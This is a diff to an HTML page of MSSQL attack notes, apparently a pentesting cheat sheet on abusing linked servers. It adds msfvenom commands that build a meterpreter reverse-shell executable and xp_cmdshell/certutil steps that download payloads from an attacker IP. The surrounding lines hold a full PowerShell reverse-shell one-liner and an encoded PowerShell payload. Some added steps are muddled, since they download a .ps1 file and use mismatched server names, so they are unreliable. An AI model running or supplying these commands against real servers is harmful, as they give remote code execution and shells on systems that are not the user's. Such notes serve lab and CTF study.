@@ -76,6 +76,14 @@
 
                 <p>Execute commands in linked server (Check which user you are)</p>
                 <pre><code class="language-sql">EXEC ('SELECT SYSTEM_USER, USER_NAME()') AT [DC02.darkzero.ext];</code></pre>
+                <p>In case you are DBO you could try to gain a shell. First generate the .exe file</p>
+                <pre><code class="language-sql">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.94 LPORT=4444 -f exe -o shell.exe</code></pre>
+                <p>Acquire it from the server through the linked server</p>
+                <pre><code class="language-sql">EXEC ('EXEC xp_cmdshell ''certutil -urlcache -split -f "http://10.10.15.94:8000/shell.ps1" "C:/shell.ps1"''') AT [LOCAL.TEST.LINKED.SRV];</code></pre>
+                <p>From your side listen and execute from the server side</p>
+                <pre><code class="language-sql">EXEC ('EXEC xp_cmdshell ''certutil -urlcache -split -f "http://10.10.15.94:8000/shell.exe" "C:/shell.exe"''') AT [LOCAL.TEST.LINKED.SRV];</code></pre>
+
+
                 <pre><code class="language-sql">EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS];</code></pre>
             </ul>
 
@@ -117,7 +125,7 @@ RECONFIGURE;</code></pre>
                 <pre><code class="language-sql">EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.14.18'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> ''; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}"';</code></pre>
                 <p>It is highly recomended to capture it using metasploit. Check this out</p>
                 <p>Generate meterpreter payload and encode it</p>
-                <pre><code class="language-sql">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.17 LPORT=4444 -f psh-cmd</code></pre>
+                <pre><code class="language-sql">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.94 LPORT=4444 -f exe -o shell.exe</code></pre>
                 <p>Keep this part from the payload</p>
                 <pre><code class="language-sql">powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAH...</code></pre>    
                 <p>Perform connection from mssql srv. Have in mind that there is a link statement at the end. It is not necessary always</p>
